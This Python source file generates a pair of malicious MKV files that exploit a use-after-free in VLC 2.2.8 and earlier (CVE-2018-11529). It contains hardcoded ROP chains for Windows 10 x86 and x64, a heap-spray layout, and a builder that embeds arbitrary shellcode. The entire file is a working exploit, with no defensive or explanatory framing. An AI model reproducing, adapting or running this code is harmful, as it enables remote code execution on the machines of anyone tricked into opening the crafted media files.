"""VLC <= 2.2.8 MKV use-after-free (CVE-2018-11529) file generators."""

from __future__ import annotations

import os
import random
import string
import struct
from dataclasses import dataclass
from pathlib import Path
from typing import List, Sequence, Tuple


PAYLOAD_SPACE = 0x300

ROP_X86: Tuple[int, ...] = (
    0x0040AE91,
    0x00407086,
    0x00000040,
    0x0040B058,
    0x41414141,
    0x41414141,
    0x41414141,
    0x004039C7,
    0x22000030,
    0x41414141,
    0x004039C8,
    0x0041193D,
    0x00409D18,
    0x00000201,
    0x0040A623,
    0x0040A623,
    0x004036CB,
    0x0040848C,
    0x00407086,
    0x0040AE95,
    0x0040AF61,
    0x22000020 + 0x5E0,
)

ROP_X64: Tuple[int, ...] = (
    0x004037AC,
    0x00403B60,
    0x40000040,
    0x004011C2,
    0x00001000,
    0x0040AB70,
    0x40000040 + 0x700,
)


@dataclass(frozen=True)
class VlcMkvTarget:
    name: str
    arch: str  # "x86" | "x64"
    ret: int
    rop: Tuple[int, ...]
    uaf_size: int
    spray_count: int


TARGETS = {
    "x86": VlcMkvTarget(
        name="VLC 2.2.8 on Windows 10 x86",
        arch="x86",
        ret=0x22000020,
        rop=ROP_X86,
        uaf_size=0x100,
        spray_count=30,
    ),
    "x64": VlcMkvTarget(
        name="VLC 2.2.8 on Windows 10 x64",
        arch="x64",
        ret=0x40000040,
        rop=ROP_X64,
        uaf_size=0x180,
        spray_count=60,
    ),
}


def data_size(number: int, numbytes=range(1, 9)) -> bytes:
    """Encode ``number`` as an EBML variable-size integer."""
    sizes: Sequence[int] = [numbytes] if isinstance(numbytes, int) else list(numbytes)
    for size in sizes:
        bits = size * 7
        if number <= (1 << bits) - 2:
            return ((1 << bits) + number).to_bytes(size, "big")
    raise ValueError(f"Can't store {number} in EBML VINT")


def _rand_bytes(n: int) -> bytes:
    return os.urandom(n)


def _rand_name(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def build_data(size: int, target: VlcMkvTarget, shellcode: bytes) -> bytes:
    """Build UAF object or heap-spray block embedding ROP + shellcode."""
    if len(shellcode) > PAYLOAD_SPACE:
        raise ValueError(
            f"Shellcode is {len(shellcode)} bytes (max {PAYLOAD_SPACE:#x})"
        )

    block_size = 0x1000
    if target.arch == "x64":
        ret_p = struct.pack("<Q", target.ret)
        rop = b"".join(struct.pack("<Q", q) for q in target.rop)
        if size == 0x180:
            obj = bytearray(b"\x41" * size)
            obj[0x30:0x38] = ret_p
            obj[0x38:0x40] = struct.pack("<Q", target.ret + 0x10000)
            obj[0x168:0x170] = struct.pack("<Q", target.ret + 0x3C0)
            obj[0x170:0x178] = ret_p
            return bytes(obj)

        block = bytearray(block_size)
        block[0x0:0x4] = b"\x41" * 4
        block[0x8 : 0x8 + 8] = ret_p
        block[0x10 : 0x10 + 8] = ret_p
        block[0x40:0x48] = struct.pack("<Q", 0x1)
        block[0x58:0x60] = struct.pack("<Q", target.ret + 0x3A8)
        block[0xE4:0xEC] = struct.pack("<Q", 0x1)
        block[0x1B8:0x1C0] = struct.pack("<Q", target.ret + 0x80)
        block[0x3B8 : 0x3B8 + len(rop)] = rop
        block[0x6D8:0x6E0] = struct.pack("<Q", target.ret + 0x10)
        block[0x700 : 0x700 + len(shellcode)] = shellcode
        tiled = bytes(block) * (size // block_size + 1)
        return tiled[:size]

    # x86
    ret_p = struct.pack("<I", target.ret)
    rop = b"".join(struct.pack("<I", d) for d in target.rop)
    if size == 0x100:
        obj = bytearray(b"\x41" * size)
        obj[0x28:0x2C] = ret_p
        obj[0x2C:0x30] = struct.pack("<I", target.ret + 0x10000)
        obj[0xF4:0xF8] = struct.pack("<I", target.ret + 0x2BC)
        obj[0xF8:0xFC] = ret_p
        return bytes(obj)

    block = bytearray(block_size)
    block[0x0:0x4] = struct.pack("<I", 0x22000040)
    block[0x4 : 0x4 + 4] = ret_p
    block[0x8 : 0x8 + 4] = ret_p
    block[0x10:0x14] = struct.pack("<I", 0xC85)
    block[0x30:0x34] = struct.pack("<I", 0x1)
    block[0xC0:0xC4] = struct.pack("<I", 0x1)
    block[0x194:0x198] = struct.pack("<I", 0x2200031C)
    block[0x2C0:0x2C4] = struct.pack("<I", 0x220002E4)
    block[0x2F4:0x2F8] = struct.pack("<I", 0x22000310)
    block[0x2F8 : 0x2F8 + len(rop)] = rop
    block[0x564:0x568] = struct.pack("<I", 0x22000588)
    block[0x5E0 : 0x5E0 + len(shellcode)] = shellcode
    tiled = bytes(block) * (size // block_size + 1)
    return tiled[:size]


def generate_mkv(target: VlcMkvTarget, shellcode: bytes) -> Tuple[bytes, bytes, int]:
    """Return (mkv_prefix, simple_block, append_count)."""
    doc_type = b"\x42\x82" + data_size(8) + b"matroska"
    ebml = b"\x1a\x45\xdf\xa3" + data_size(len(doc_type)) + doc_type

    seek_entry = b"\x53\xab" + data_size(4)
    seek_entry += b"\x15\x49\xa9\x66"
    seek_entry += b"\x53\xac" + data_size(2) + b"\xff" * 2
    seek_entries = b"\x4d\xbb" + data_size(len(seek_entry)) + seek_entry

    seek_entry = b"\x53\xab" + data_size(4)
    seek_entry += b"\x11\x4d\x9b\x74"
    seek_entry += b"\x53\xac" + data_size(4) + b"\xff" * 4
    seek_entries += b"\x4d\xbb" + data_size(len(seek_entry)) + seek_entry

    seek_entry = b"\x53\xab" + data_size(4)
    seek_entry += b"\x10\x43\xa7\x70"
    seek_entry += b"\x53\xac" + data_size(4) + b"\xff" * 4
    seek_entries += b"\x4d\xbb" + data_size(len(seek_entry)) + seek_entry

    seek_head = b"\x11\x4d\x9b\x74" + data_size(len(seek_entries)) + seek_entries
    void = b"\xec" + data_size(2) + b"\x41"

    segment_uid = b"\x73\xa4" + data_size(16) + _rand_bytes(16)
    info = b"\x15\x49\xa9\x66" + data_size(len(segment_uid)) + segment_uid

    chapter_segment_uid = b"\x6e\x67" + data_size(16) + _rand_bytes(16)
    chapter_atom = b"\xb6" + data_size(len(chapter_segment_uid)) + chapter_segment_uid
    edition_entry = b"\x45\xb9" + data_size(len(chapter_atom)) + chapter_atom
    chapters = b"\x10\x43\xa7\x70" + data_size(len(edition_entry)) + edition_entry

    mime = b"\x46\x60" + data_size(24) + b"application/octet-stream"
    data = build_data(target.uaf_size, target, shellcode)
    data = b"\x46\x5c" + data_size(len(data)) + data

    attached_files = bytearray()
    for _ in range(500):
        uid = b"\x46\xae" + data_size(8) + _rand_bytes(8)
        file_name = b"\x46\x6e" + data_size(8) + _rand_bytes(8)
        header = b"\x61\xa7" + data_size(
            len(uid) + len(file_name) + len(mime) + len(data)
        )
        attached_files += header + file_name + mime + uid + data
    attachments = b"\x19\x41\xa4\x69" + data_size(len(attached_files)) + bytes(attached_files)

    pay_load = build_data(0xFFF000, target, shellcode)
    simple_block = b"\xa3" + data_size(len(pay_load)) + pay_load
    simple_blocks_len = len(simple_block) * target.spray_count
    time_code = b"\xe7" + data_size(1) + b"\x00"
    cluster = (
        b"\x1f\x43\xb6\x75"
        + data_size(len(time_code) + simple_blocks_len)
        + time_code
    )

    segment_data = seek_head + void + info + chapters + attachments + cluster
    segment = (
        b"\x18\x53\x80\x67"
        + data_size(len(segment_data) + simple_blocks_len)
        + segment_data
    )
    mkv = ebml + segment
    return mkv, simple_block, target.spray_count


def write_vlc_mkv_pair(
    output_dir: Path,
    shellcode: bytes,
    *,
    arch: str = "x86",
    mkv_one: str = "",
    mkv_two: str = "",
) -> List[Path]:
    """Write part1 (vuln+spray) and part2 (path trigger) MKV files."""
    key = (arch or "x86").lower()
    if key not in TARGETS:
        raise ValueError(f"Unknown arch/target: {arch} (use x86 or x64)")
    target = TARGETS[key]

    mkv1, simple_block, count = generate_mkv(target, shellcode)
    mkv2 = mkv1[:0x4F] + b"\x15\x49\xa9\x66" + data_size(10)

    tmp = _rand_name(random.randint(3, 8))
    f1 = (mkv_one or f"{tmp}-part1").strip()
    f2 = (mkv_two or f"{tmp}-part2").strip()
    if not f1.lower().endswith(".mkv"):
        f1 += ".mkv"
    if not f2.lower().endswith(".mkv"):
        f2 += ".mkv"

    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    path1 = output_dir / Path(f1).name
    path2 = output_dir / Path(f2).name

    path1.write_bytes(mkv1)
    with path1.open("ab") as fd:
        for _ in range(count):
            fd.write(simple_block)
    path2.write_bytes(mkv2)
    return [path1, path2]
